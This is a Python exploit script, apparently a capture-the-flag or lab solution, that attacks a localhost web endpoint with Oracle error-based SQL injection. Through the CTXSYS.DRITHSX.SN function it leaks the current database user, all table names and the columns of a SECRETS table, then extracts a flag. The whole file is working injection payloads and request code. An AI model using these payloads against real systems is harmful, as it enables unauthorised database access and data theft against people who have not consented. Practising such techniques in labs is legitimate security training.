#!/usr/bin/env python3
import requests
import re

BASE_URL = "http://localhost:5015/report"

def exploit():
    print("[*] Starting Oracle Error-based SQLi exploitation...")
    print("[*] Target: CTXSYS.DRITHSX.SN method\n")

    # Step 1: Get current user
    print("[1] Enumerating current user...")
    payload = "1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--"
    response = requests.get(BASE_URL, params={"id": payload})
    user_match = re.search(r"thesaurus ([A-Z_]+) does not exist", response.text)
    if user_match:
        print(f"    [+] Current user: {user_match.group(1)}\n")

    # Step 2: List all tables
    print("[2] Enumerating tables...")
    payload = "1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables))--"
    response = requests.get(BASE_URL, params={"id": payload})
    tables_match = re.search(r"thesaurus ([A-Z,]+) does not exist", response.text)
    if tables_match:
        tables = tables_match.group(1)
        print(f"    [+] Found tables: {tables}\n")

    # Step 3: List columns in SECRETS table
    print("[3] Enumerating columns in SECRETS table...")
    payload = "1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='SECRETS'))--"
    response = requests.get(BASE_URL, params={"id": payload})
    columns_match = re.search(r"thesaurus ([A-Z,]+) does not exist", response.text)
    if columns_match:
        columns = columns_match.group(1)
        print(f"    [+] Found columns: {columns}\n")

    # Step 4: Extract flag
    print("[4] Extracting flag from SECRETS.VALUE...")
    payload = "1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT VALUE FROM SECRETS))--"
    response = requests.get(BASE_URL, params={"id": payload})
    flag_match = re.search(r"FLAG\{[^}]+\}", response.text)

    if flag_match:
        flag = flag_match.group(0)
        print(f"    [+] Flag found: {flag}\n")
        print("=" * 60)
        print(f"SUCCESS: {flag}")
        print("=" * 60)
        return flag
    else:
        print("    [-] Flag not found")
        return None

if __name__ == "__main__":
    exploit()

